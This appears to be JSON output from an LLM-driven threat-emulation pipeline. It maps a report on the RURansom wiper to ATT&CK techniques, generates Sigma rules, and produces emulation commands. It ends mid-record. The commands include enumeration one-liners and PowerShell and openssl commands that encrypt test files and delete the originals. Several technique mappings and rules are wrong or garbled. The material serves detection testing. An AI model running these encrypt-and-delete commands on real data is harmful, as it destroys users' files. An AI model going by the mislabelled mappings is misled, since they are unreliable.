{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 12,
      "processing_time_ms": 0
    },
    "extraction_results": [
      {
        "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
        "extracted_ttps": [
          {
            "ttp_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
            "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
            "technique_name": "Network Service Scanning",
            "attack_id": "T1046",
            "tactic": "Discovery",
            "description": "The malware scans for specific file extensions, potentially using network service scanning",
            "confidence_score": 0.732,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 1.0,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              ".doc",
              ".docx",
              ".png",
              ".gif",
              ".jpeg",
              ".jpg",
              ".mp4",
              ".txt",
              ".flv",
              ".mp3",
              ".ppt",
              ".pptx",
              ".xls",
              ".xlsx"
            ],
            "tools": [
              "net",
              "ping",
              "sc",
              "base64",
              "at",
              "reflective"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "90893f48-ba06-4abc-89ff-3539c7b931c3",
            "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
            "technique_name": "Data Encrypted for Impact",
            "attack_id": "T1486",
            "tactic": "Impact",
            "description": "The malware uses AES-CBC encryption with a hard-coded salt and unique keys for each file, making the encryption irreversible and marking it as a wiper.",
            "confidence_score": 0.709,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.537,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "\u041f\u043e\u043b\u043d\u043e\u043c\u0430\u0441\u0448\u0442\u0430\u0431\u043d\u043e\u0435_\u043a\u0438\u0431\u0435\u0440\u0432\u0442\u043e\u0440\u0436\u0435\u043d\u0438\u0435.txt",
              "AES-CBC"
            ],
            "tools": [
              "net",
              "ping",
              "sc",
              "base64",
              "at",
              "malware",
              "reflective"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
            "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "The malware drops a 'ransom' note, which is actually a wiper note, into each directory, potentially intended to mislead or intimidate the victim.",
            "confidence_score": 0.695,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.484,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "\u041f\u043e\u043b\u043d\u043e\u043c\u0430\u0441\u0448\u0442\u0430\u0431\u043d\u043e\u0435_\u043a\u0438\u0431\u0435\u0440\u0432\u0442\u043e\u0440\u0436\u0435\u043d\u0438\u0435.txt"
            ],
            "tools": [
              "net",
              "ping",
              "sc",
              "base64",
              "at",
              "malware",
              "reflective"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
            "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The malware uses command and scripting interpreter to execute commands with elevated privileges",
            "confidence_score": 0.685,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.66,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "at",
              "net",
              "ping",
              "sc"
            ],
            "tools": [
              "net",
              "ConfuserEx",
              "ping",
              "sc",
              "base64",
              "at",
              "reflective"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "567bbfa8-427c-49cf-bcb2-0af157bd0ab3",
            "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
            "technique_name": "File and Directory Discovery",
            "attack_id": "T1083",
            "tactic": "Discovery",
            "description": "The malware tests if it's being run from Russia, potentially using file and directory discovery techniques",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Russia"
            ],
            "tools": [
              "net",
              "ping",
              "sc",
              "base64",
              "at",
              "RURansom",
              "reflective"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
            "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "RURansom wiper malware spreads by copying itself to removable disks and mapped network shares",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "\u0420\u043e\u0441\u0441\u0438\u044f-\u0423\u043a\u0440\u0430\u0438\u043d\u0430_\u0412\u043e\u0439\u043d\u0430-\u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435.doc.exe",
              "Russia-Ukraine_War-Update.doc.exe"
            ],
            "tools": [
              "net",
              "ping",
              "sc",
              "base64",
              "at",
              "RURansom",
              "reflective"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
            "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
            "technique_name": "Boot or Logon Autostart Execution",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "The malware attempts to start the process with elevated privileges, potentially using boot or logon autostart execution",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.428,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "elevated privileges"
            ],
            "tools": [
              "net",
              "ping",
              "sc",
              "base64",
              "at",
              "reflective"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
            "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
            "technique_name": "Signed Binary Proxy Execution",
            "attack_id": "T1218",
            "tactic": "Defense Evasion",
            "description": "The malware uses a downloader for an XMRig binary, potentially using signed binary proxy execution",
            "confidence_score": 0.674,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "XMRig"
            ],
            "tools": [
              "net",
              "ping",
              "sc",
              "XMRig",
              "base64",
              "at",
              "reflective"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "95dda582-1870-4d22-b95f-5c8ad9c71a36",
            "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The malware uses .NET programming language, potentially leveraging command and scripting interpreters for execution",
            "confidence_score": 0.67,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              ".NET"
            ],
            "tools": [
              "net",
              "ping",
              "sc",
              "base64",
              "at",
              "RURansom",
              "reflective"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c6ec10ea-72a1-46b8-86b7-955432e0a5be",
            "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
            "technique_name": "Data Encrypted for Impact",
            "attack_id": "T1486",
            "tactic": "Impact",
            "description": "RURansom malware encrypts files on the victim's system, making them irreversibly destroyed",
            "confidence_score": 0.663,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C:\\Users\\<UserName>"
            ],
            "tools": [
              "net",
              "ping",
              "sc",
              "base64",
              "at",
              "RURansom",
              "reflective"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
            "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "The malware uses ConfuserEx for obfuscation, making it difficult to detect",
            "confidence_score": 0.66,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ConfuserEx"
            ],
            "tools": [
              "net",
              "ConfuserEx",
              "ping",
              "sc",
              "base64",
              "at",
              "reflective"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "4aa62598-d8a6-4d80-a7c7-d4148ad691b7",
            "report_id": "pdf-3e111880b47e79c0febda4cc3afd4bf7",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "ping",
              "sc",
              "base64",
              "at",
              "reflective"
            ],
            "extraction_method": "nlp_indicator"
          }
        ]
      }
    ]
  },
  "rules": {
    "rules": [
      {
        "title": "Network Service Scanning via File Extension Scanning",
        "description": "Detects potential network service scanning by looking for processes that access files with specific extensions",
        "logsource": {
          "category": "file_event",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "TargetFilename|endswith": [
              ".doc",
              ".docx",
              ".png",
              ".gif",
              ".jpeg",
              ".jpg",
              ".mp4",
              ".txt",
              ".flv",
              ".mp3",
              ".ppt",
              ".pptx",
              ".xls",
              ".xlsx"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate file access by system processes",
          "File access by backup or antivirus software"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1567"
        ],
        "ttp_id": "unknown",
        "technique_name": "Network Service Scanning",
        "generation_method": "langchain",
        "id": "e517e09c-4f2d-4f17-9b63-fbd415cb1f4b",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 360.0
        }
      },
      {
        "title": "Data Encrypted for Impact (Wiper Malware)",
        "description": "Detects the use of AES-CBC encryption with a hard-coded salt and unique keys for each file, indicating a potential wiper malware attack",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "AES-CBC",
            "ParentImage|endswith": ".exe",
            "Image|endswith": ".exe"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate encryption tools used by administrators",
          "Penetration testing activities using similar command line arguments"
        ],
        "level": "high",
        "tags": [
          "attack.impact",
          "attack.t1565",
          "custom.wiper",
          "custom.malware"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Encrypted for Impact",
        "generation_method": "langchain",
        "id": "f77bc85e-adc4-4a3e-8868-68d988170ddf",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 87,
          "query_time_ms": 565.0000000000001
        }
      },
      {
        "title": "Phishing Detection via Office Process Spawning Command Shells",
        "description": "Detects potential phishing activity by identifying Office processes spawning command shells",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image": "C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE",
            "ChildProcessImage": "C:\\Windows\\System32\\cmd.exe"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative or development activities involving command shells",
          "False positives may occur in environments where command shells are frequently used for legitimate purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.t1566",
          "attack.initial_access"
        ],
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "generation_method": "langchain",
        "id": "c8d3e23d-cc4f-4325-aad6-8a7b103efb8e",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 71,
          "query_time_ms": 594.0
        }
      },
      {
        "title": "Detection: Command and Scripting Interpreter",
        "description": "The malware uses command and scripting interpreter to execute commands with elevated privileges",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "fallback",
        "id": "93612f8c-dc92-45d7-8dfe-fa60428bf167",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 534.0
        }
      },
      {
        "title": "File and Directory Discovery for Russia",
        "description": "Detects potential file and directory discovery techniques used by malware to test if it's being run from Russia",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "Russia"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate processes using Russia-related keywords in command line arguments"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1567"
        ],
        "ttp_id": "unknown",
        "technique_name": "File and Directory Discovery",
        "generation_method": "langchain",
        "id": "99490971-85c7-4ee9-bcbc-d2d4c592380b",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 667.0
        }
      },
      {
        "title": "Exploit Public-Facing Application via RURansom Wiper Malware",
        "description": "Detects the execution of RURansom wiper malware by monitoring for suspicious process creations",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              ".doc.exe"
            ],
            "CommandLine|contains": [
              "\u0420\u043e\u0441\u0441\u0438\u044f-\u0423\u043a\u0440\u0430\u0438\u043d\u0430_\u0412\u043e\u0439\u043d\u0430-\u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435",
              "Russia-Ukraine_War-Update"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate users executing files with similar names"
        ],
        "level": "critical",
        "tags": [
          "attack.initial_access",
          "attack.t1566"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "generation_method": "langchain",
        "id": "52abec45-d4a0-44e7-9225-b0c4a3233c02",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 367.0
        }
      },
      {
        "title": "Boot or Logon Autostart Execution",
        "description": "Detects malware attempting to start a process with elevated privileges using boot or logon autostart execution",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": ".exe",
            "User|contains": "NT AUTHORITY\\SYSTEM"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate software installations or updates",
          "Administrative tasks run with elevated privileges"
        ],
        "level": "medium",
        "tags": [
          "attack.persistence",
          "attack.t1569"
        ],
        "ttp_id": "unknown",
        "technique_name": "Boot or Logon Autostart Execution",
        "generation_method": "langchain",
        "id": "c135eb32-00e6-4c12-b649-e2b53c1b1352",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 77,
          "query_time_ms": 401.0
        }
      },
      {
        "title": "Signed Binary Proxy Execution via XMRig",
        "description": "Detects the use of signed binary proxy execution to download XMRig malware",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "XMRig",
            "CommandLine|contains": "XMRig"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate processes using similar image or command line patterns"
        ],
        "level": "medium",
        "tags": [
          "attack.defense_evasion",
          "attack.signed_binary_proxy_execution"
        ],
        "ttp_id": "unknown",
        "technique_name": "Signed Binary Proxy Execution",
        "generation_method": "langchain",
        "id": "b28e47f5-e2f4-459d-b7d8-6bcee9507180",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 2,
          "query_time_ms": 1282.0
        }
      },
      {
        "title": "Obfuscated Files or Information Detection",
        "description": "Detects the use of ConfuserEx for obfuscation, a technique used by malware to evade detection",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "ConfuserEx.exe",
            "CommandLine|contains": "ConfuserEx"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate use of ConfuserEx for software development or testing purposes",
          "False positives may occur if ConfuserEx is used by a legitimate process or application"
        ],
        "level": "medium",
        "tags": [
          "attack.defense_evasion",
          "attack.t1564.001"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "id": "80cef4a3-318c-417e-8683-02760c5a4723",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 1071.0
        }
      }
    ],
    "status": "success"
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "average_quality_score": 0.5644444444444444
    }
  },
  "attacks": [
    {
      "id": "cfef7b8a-90a4-468b-acf3-5835bfdf1581",
      "ttp_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
      "technique_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "net view \\\\localhost",
      "description": "Basic network service scan using legacy 'net' command to list shared resources on the local machine",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists shared folders and resources on the local system. Fails silently if no shares exist.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:00.914698",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.732,
      "validated": true
    },
    {
      "id": "5325e260-9722-4442-ad71-0396901f7036",
      "ttp_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
      "technique_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "wmic service where (State='Running') get Name,DisplayName,PathName",
      "description": "Intermediate scan to enumerate running services and their executable paths using wmic",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a list of currently running services, including display name and binary path.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:00.915205",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.732,
      "validated": true
    },
    {
      "id": "27855f91-4acc-4d3c-8155-ee79124ec9ba",
      "ttp_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
      "technique_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"Get-WmiObject -Class Win32_Share -ErrorAction SilentlyContinue | Select-Object Name, Path, Description\"",
      "description": "Advanced scan using PowerShell to retrieve detailed information about active network shares",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Returns a list of configured shares on the system, including their local path and name, if any exist.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:00.915205",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.732,
      "validated": true
    },
    {
      "id": "798c30c7-7327-4890-816c-be224bfe195c",
      "ttp_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
      "technique_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ls -la /tmp | grep '\\.txt$' | head -n 5",
      "description": "Basic enumeration of text files in /tmp directory to simulate scanning for sensitive files",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists up to 5 .txt files in /tmp with detailed info, simulating initial file extension scanning",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.209422",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.732,
      "validated": true
    },
    {
      "id": "17a12ca4-f1db-4ffc-91e6-cde0ec287005",
      "ttp_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
      "technique_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "find /home -type f -name \"*.conf\" -o -name \"*.bak\" 2>/dev/null | head -n 10",
      "description": "Intermediate scan for configuration and backup files in user directories, typical in discovery phases",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Finds up to 10 files with .conf or .bak extensions in /home, skipping permission-denied errors",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.209422",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.732,
      "validated": true
    },
    {
      "id": "d9dd278a-b1bb-499a-931a-e25e3330e198",
      "ttp_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
      "technique_id": "3a86ecb3-eea0-4609-9414-e9bbfd157cdb",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "find /tmp -type f -name \"*.sh\" -exec sh -c 'echo \"[SCANNING] {} has size: $(du -h \"{}\" 2>/dev/null | cut -f1)\"' \\; 2>/dev/null",
      "description": "Advanced scanning with execution of inline inspection for shell scripts in /tmp",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Scans for .sh files in /tmp and prints their size, simulating deeper inspection of discovered files",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.209422",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.732,
      "validated": true
    },
    {
      "id": "1a0fbc06-6f3d-416c-a40f-7208102ac5ee",
      "ttp_id": "90893f48-ba06-4abc-89ff-3539c7b931c3",
      "technique_id": "90893f48-ba06-4abc-89ff-3539c7b931c3",
      "technique_name": "Data Encrypted for Impact",
      "tactic": "Impact",
      "platform": "windows",
      "command": "echo 'test data' > \"%TEMP%\\important_file.txt\" & powershell -Command \"\"\"$key = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $iv = [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes(16); $aes = [System.Security.Cryptography.Aes]::Create(); $aes.Mode = 'CBC'; $aes.Key = $key; $aes.IV = $iv; $inputStream = [System.IO.File]::OpenRead('%TEMP%\\important_file.txt'); $outputStream = [System.IO.File]::Create('%TEMP%\\important_file.txt.enc'); $cryptoStream = $aes.CreateEncryptor().CreateEncryptor($inputStream, $outputStream); $inputStream.CopyTo($cryptoStream); $cryptoStream.Close(); $inputStream.Close(); $outputStream.Close(); [System.IO.File]::Delete('%TEMP%\\important_file.txt')\"\"\"",
      "description": "Encrypts a single test file using AES-CBC with a hard-coded key and random IV, then deletes the original.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Creates a test file, encrypts it using AES-CBC, saves output with .enc extension, and removes the original. Uses only built-in .NET crypto APIs via PowerShell due to lack of native Windows encryption tools.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:26.997097",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "494974ce-c8e4-48df-8f94-ffeef48eed9b",
      "ttp_id": "90893f48-ba06-4abc-89ff-3539c7b931c3",
      "technique_id": "90893f48-ba06-4abc-89ff-3539c7b931c3",
      "technique_name": "Data Encrypted for Impact",
      "tactic": "Impact",
      "platform": "windows",
      "command": "for %i in (\"%TEMP%\\doc1.txt\" \"%TEMP%\\doc2.txt\" \"%TEMP%\\config.bak\") do echo test content > \"%i\" & powershell -Command \"\"\"Get-ChildItem '%TEMP%' -Filter '*.txt' | ForEach-Object { $key = [System.Text.Encoding]::UTF8.GetBytes(('A' * 16)); $iv = [byte[]](1..16); $aes = [System.Security.Cryptography.Aes]::Create(); $aes.Mode = 'CBC'; $aes.Key = $key; $aes.IV = $iv; $inFile = $_.FullName; $outFile = $_.FullName + '.encrypted'; $inputStream = [System.IO.File]::OpenRead($inFile); $outputStream = [System.IO.File]::Create($outFile); $cryptoStream = $aes.CreateEncryptor().CreateEncryptor($inputStream, $outputStream); $inputStream.CopyTo($cryptoStream); $cryptoStream.Close(); $inputStream.Close(); $outputStream.Close(); Remove-Item $inFile -Force }\"\"\"",
      "description": "Encrypts multiple .txt files in %TEMP% using AES-CBC with a fixed key and IV, then deletes originals.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Creates several test files, encrypts each with the same hard-coded key and fixed IV, appends '.encrypted' extension, and deletes original files using -Force. Simulates batch encryption behavior seen in wipers.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:26.997721",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "3bb2239d-95d6-4d26-9618-66a42bca3264",
      "ttp_id": "90893f48-ba06-4abc-89ff-3539c7b931c3",
      "technique_id": "90893f48-ba06-4abc-89ff-3539c7b931c3",
      "technique_name": "Data Encrypted for Impact",
      "tactic": "Impact",
      "platform": "linux",
      "command": "openssl enc -aes-256-cbc -salt -in /tmp/testfile.txt -out /tmp/testfile.txt.enc -k 'hardcodedpass' && rm -f /tmp/testfile.txt",
      "description": "Encrypts a single test file using AES-CBC with a hard-coded salt and password, then deletes the original.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The file /tmp/testfile.txt is encrypted to /tmp/testfile.txt.enc and removed. Original data is irrecoverable without the password.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:28.651014",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "63529408-d21c-45bd-b1b0-5e8d0bef9ee1",
      "ttp_id": "90893f48-ba06-4abc-89ff-3539c7b931c3",
      "technique_id": "90893f48-ba06-4abc-89ff-3539c7b931c3",
      "technique_name": "Data Encrypted for Impact",
      "tactic": "Impact",
      "platform": "linux",
      "command": "find /tmp -maxdepth 1 -name 'victim_*.dat' -type f -exec sh -c 'openssl enc -aes-256-cbc -salt -in \"$1\" -out \"$1.enc\" -k \"hardcodedpass\" -md md5 && rm -f \"$1\"' _ {} \\;",
      "description": "Finds specific test data files in /tmp and encrypts each with AES-CBC using a hard-coded salt and key, then removes originals.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Each file matching victim_*.dat in /tmp is encrypted with .enc extension and deleted. Encryption uses consistent password but unique keys due to salt.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:28.651014",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "d1b19420-6642-41f1-95c3-d3f88556679b",
      "ttp_id": "90893f48-ba06-4abc-89ff-3539c7b931c3",
      "technique_id": "90893f48-ba06-4abc-89ff-3539c7b931c3",
      "technique_name": "Data Encrypted for Impact",
      "tactic": "Impact",
      "platform": "linux",
      "command": "dd if=/dev/urandom of=/tmp/victim_data.dat bs=1k count=100; echo 'sensitive content' > /tmp/victim_data.dat; openssl enc -aes-256-cbc -salt -in /tmp/victim_data.dat -out /tmp/victim_data.dat.enc -k 'hardcodedpass' -md md5 && rm -f /tmp/victim_data.dat",
      "description": "Creates a test data file, overwrites it with benign content, encrypts it using AES-CBC with salt, then deletes the original.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "A 100KB file is created in /tmp, written with test content, encrypted with a hard-coded password and salt, and original removed.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:28.651014",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "c1fd9ec2-4827-456b-9e80-08626fec0d83",
